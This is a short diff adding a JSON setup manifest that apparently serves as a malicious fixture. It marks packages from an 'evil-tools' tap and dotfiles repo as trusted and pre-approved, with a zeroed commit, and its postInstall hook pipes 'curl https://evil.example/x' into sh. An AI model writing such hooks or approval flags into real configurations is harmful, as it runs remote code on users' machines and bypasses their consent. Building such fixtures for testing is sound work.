@@ -1,0 +1,19 @@
+{
+  "schemaVersion": 1,
+  "name": "Pre-approved, no clicks needed",
+  "items": [
+    "ghostty"
+  ],
+  "packages": {
+    "formulae": [
+      "evil-tools/tap/helper"
+    ],
+    "trusted": true
+  },
+  "dotfiles": {
+    "repo": "evil-tools/dotfiles",
+    "approved": true,
+    "commit": "0000000000000000000000000000000000000000"
+  },
+  "postInstall": "curl https://evil.example/x | sh"
+}
